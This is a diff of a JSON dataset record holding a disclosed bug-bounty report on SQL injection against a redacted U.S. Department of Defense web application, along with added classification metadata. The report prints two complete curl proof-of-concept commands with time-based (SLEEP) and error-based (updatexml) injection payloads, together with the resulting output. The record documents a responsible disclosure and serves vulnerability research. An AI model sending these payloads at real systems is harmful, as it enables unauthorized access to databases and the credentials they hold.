@@ -1,42 +1,46 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "cdl ",
-    "title": "SQL Injection on https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
-    "content": "\nSummary:\nhttps://\u2588\u2588\u2588\u2588 is vulnerable to SQL Injection.\nDescription:\nThe \u2588\u2588\u2588\u2588\u2588\u2588\u2588 parameter in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588 does not properly sanitize input, thus allowing an attacker to execute SQL queries on the server!\nImpact\nThis is a high impact vulnerability! I saw a list of tables which I'm guessing contain confidential information such as emails, usernames, passwords, etc! Attackers could likely leverage this to Remote Code Execution by finding admin credentials, then gaining unauthorized access to an admin panel!\nStep-by-step Reproduction Instructions\nProof of Concept #1:\nOpen up your terminal!\nPaste this command\nCode 525 Bytes\n1curl -i -s -k  -X $'POST' \\\n2    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588?\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=K' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \\\n4    --data-binary $'\u2588\u2588\u2588\u2588\u2588=K*\\' OR SLEEP(10) AND \\'aSgl\\'=\\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&emailid2=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' \\\n5    $'https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\nNow the server will sleep for 10 seconds and then respond!\nProof of Concept #2:\nCode 552 Bytes\n1curl -i -s -k  -X $'POST' \\\n2    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588?\u2588\u2588\u2588\u2588\u2588=K' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \\\n4    --data-binary $'\u2588\u2588\u2588\u2588\u2588=K*\\' OR updatexml(null,concat(0x3a3a,version()),null) AND \\'aSgl\\'=\\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&emailid2=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' \\\n5    $'https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588'\nYou will see: \"<br><br>You have this list added to your current optionsXPATH syntax error: '::\u2588\u2588\u2588\u2588'\"\nwhich is the MySQL version!\ninformation:\nCurrent User: \u2588\u2588\u2588\u2588\u2588\u2588\u2588@localhost\nDatabases: \u2588\u2588\u2588\u2588\u2588\nVersion: \u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nSanitize sanitize sanitize!!\nThanks as always ;)\n-Corben Douglas (@sxcurity)\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "cdl ",
+  "title": "SQL Injection on https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
+  "content": "\nSummary:\nhttps://\u2588\u2588\u2588\u2588 is vulnerable to SQL Injection.\nDescription:\nThe \u2588\u2588\u2588\u2588\u2588\u2588\u2588 parameter in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588 does not properly sanitize input, thus allowing an attacker to execute SQL queries on the server!\nImpact\nThis is a high impact vulnerability! I saw a list of tables which I'm guessing contain confidential information such as emails, usernames, passwords, etc! Attackers could likely leverage this to Remote Code Execution by finding admin credentials, then gaining unauthorized access to an admin panel!\nStep-by-step Reproduction Instructions\nProof of Concept #1:\nOpen up your terminal!\nPaste this command\nCode 525 Bytes\n1curl -i -s -k  -X $'POST' \\\n2    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588?\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=K' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \\\n4    --data-binary $'\u2588\u2588\u2588\u2588\u2588=K*\\' OR SLEEP(10) AND \\'aSgl\\'=\\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&emailid2=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' \\\n5    $'https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\nNow the server will sleep for 10 seconds and then respond!\nProof of Concept #2:\nCode 552 Bytes\n1curl -i -s -k  -X $'POST' \\\n2    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588?\u2588\u2588\u2588\u2588\u2588=K' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \\\n4    --data-binary $'\u2588\u2588\u2588\u2588\u2588=K*\\' OR updatexml(null,concat(0x3a3a,version()),null) AND \\'aSgl\\'=\\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&emailid2=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' \\\n5    $'https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588'\nYou will see: \"<br><br>You have this list added to your current optionsXPATH syntax error: '::\u2588\u2588\u2588\u2588'\"\nwhich is the MySQL version!\ninformation:\nCurrent User: \u2588\u2588\u2588\u2588\u2588\u2588\u2588@localhost\nDatabases: \u2588\u2588\u2588\u2588\u2588\nVersion: \u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nSanitize sanitize sanitize!!\nThanks as always ;)\n-Corben Douglas (@sxcurity)\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1652399940,
+  "report_url": "https://hackerone.com/reports/232378",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Open terminal and execute the first curl command with a crafted SQL injection payload (SLEEP(10)) to demonstrate time-based SQL injection."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "SQL Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1652399940,
-    "report_url": "https://hackerone.com/reports/232378",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Open terminal and execute the first curl command with a crafted SQL injection payload (SLEEP(10)) to demonstrate time-based SQL injection."
-        ],
-        [
-            2,
-            "Execute the second curl command with a different SQL injection payload (updatexml) to extract database version information, confirming the vulnerability."
-        ]
-    ],
-    "vuln_description": "The vulnerability is a SQL Injection in a web application where the \u2588\u2588\u2588\u2588\u2588\u2588\u2588 parameter does not properly sanitize input, allowing attackers to execute arbitrary SQL queries. This can lead to unauthorized data access, including sensitive information like emails, usernames, and passwords, and potentially remote code execution.",
-    "reason": "The attack involves straightforward SQL injection techniques without requiring complex application state manipulation or understanding of novel logic. The steps are direct and do not involve multiple interacting components or subtle interactions.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The SQL Injection vulnerability involves improper input sanitization and direct database manipulation, which is not related to authentication or authorization boundaries crossed by swapping user sessions or resource IDs. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities, not injection flaws.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Execute the second curl command with a different SQL injection payload (updatexml) to extract database version information, confirming the vulnerability."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a SQL Injection in a web application where the \u2588\u2588\u2588\u2588\u2588\u2588\u2588 parameter does not properly sanitize input, allowing attackers to execute arbitrary SQL queries. This can lead to unauthorized data access, including sensitive information like emails, usernames, and passwords, and potentially remote code execution.",
+  "reason": "The attack involves straightforward SQL injection techniques without requiring complex application state manipulation or understanding of novel logic. The steps are direct and do not involve multiple interacting components or subtle interactions.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL Injection vulnerability involves direct manipulation of SQL queries through unsanitized input parameters, which is not related to authentication or authorization bypass via session or resource ID manipulation. The methodology described focuses on AuthN/AuthZ bypass and IDOR vulnerabilities by testing session and resource ID combinations, not SQL query manipulation.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The SQL Injection vulnerability described uses simple time-based (SLEEP) and error-based (updatexml) payloads that are common in standard SQLi payload lists. These payloads don't require custom filter bypasses and their effects (delayed response/error messages) are detectable in the same HTTP channel through regular response observation. The methodology explicitly includes blind SQLi detection via response analysis without requiring stored payload triggering through alternate navigation paths.",
+    "is_simple_injection": true
+  }
 }
